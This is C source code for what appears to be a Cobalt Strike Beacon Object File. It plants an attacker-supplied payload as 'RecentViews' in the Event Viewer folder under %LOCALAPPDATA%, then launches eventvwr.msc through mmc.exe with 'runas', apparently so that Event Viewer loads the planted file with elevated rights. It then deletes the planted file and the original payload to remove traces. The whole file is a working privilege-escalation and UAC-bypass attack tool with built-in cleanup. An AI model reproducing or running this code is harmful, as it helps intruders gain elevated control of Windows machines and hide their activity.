#include <windows.h>
#include <wtsapi32.h>
#include <shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <combaseapi.h>
#include <heapapi.h>
#include <stdio.h>
#include <stdlib.h>
#include "beacon.h"
#include "bofdefs.h"

#pragma warning( disable : 4996)

DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryW(LPCTSTR, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CopyFileW(LPCTSTR, LPCTSTR, BOOL);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileW(LPCTSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI SHLWAPI$PathFileExistsW(LPCTSTR);
WINBASEAPI wchar_t WINAPI MSVCRT$wcscat(wchar_t * destination, const wchar_t * source);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileW(LPCTSTR);

void go(IN char * Buffer, IN int Length)
{   
    
    wchar_t originalLocation[100] = {0};
    wchar_t newLocation[100] = {0};
 
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    wchar_t* PayloadFile = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* EnvPath = (wchar_t*)BeaconDataExtract(&parser, NULL);
    
    MSVCRT$wcscat(originalLocation, L"C:\\Windows\\Tasks\\");
    MSVCRT$wcscat(originalLocation, PayloadFile);
   
    DWORD errorcode;


    //------------------------Check to see if %LOCALAPPDATA%\Microsoft\Event Viewer exists, make if not-----------------------------
    
    char envVarName[] = "LOCALAPPDATA";
    char Path[MAX_PATH];
    GetEnvironmentVariableA(envVarName, Path, MAX_PATH); //Get %LOCALAPPDATA% value
    strcat(Path, "\\Microsoft\\Event Viewer"); //Add directory to %LOCALAPPDATA%
    DWORD res = GetFileAttributesA(Path); //Check to see if dir exists, if not create it.
    {
        if (res == INVALID_FILE_ATTRIBUTES)
        {
            CreateDirectoryA(Path, NULL);
        }
        else
        {
            
        }
    }
   
    //---------------------------------------Write Payload to envVar\ReCentViews--------------------------------------------------------

     
     MSVCRT$wcscat(newLocation, EnvPath);
     MSVCRT$wcscat(newLocation, L"\\Microsoft\\Event Viewer\\");

    
    //MSVCRT$wcscat(newLocation, L"C:\\Users\\test\\AppData\\Local\\Microsoft\\Event Viewer\\");
    
    MSVCRT$wcscat(newLocation, PayloadFile);
    KERNEL32$CopyFileW((LPCTSTR)originalLocation, (LPCTSTR)newLocation, FALSE);

    errorcode = KERNEL32$GetLastError();
    if(errorcode!=0){
        if(errorcode==32){
            BeaconPrintf(CALLBACK_ERROR, "Error %d: Could not copy the executable to the destination because it is running by another program. Please kill the process and retry.", KERNEL32$GetLastError());
        }else{
            BeaconPrintf(CALLBACK_ERROR, "Error %d: Could not copy the executable to the destination.", KERNEL32$GetLastError());
        }   
    }else{
        BeaconPrintf(CALLBACK_OUTPUT, "Executable copied successfully.");
    }


    //-----------------------------------------------Start Eventviewer-------------------------------------------------------------------
    ShellExecuteA(NULL, "runas", "C:\\Windows\\system32\\mmc.exe", "C:\\Windows\\system32\\eventvwr.msc", NULL, 0); //Pass runas for UAC

    //----------------------------------------Wait for EventViewer to run, then delete payload,  cleanup--------------------------------------------
    Sleep(2000);
    strcat(Path, "\\RecentViews"); 
    BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up...");
    DeleteFileA(Path);
    KERNEL32$DeleteFileW((LPCTSTR)originalLocation);


}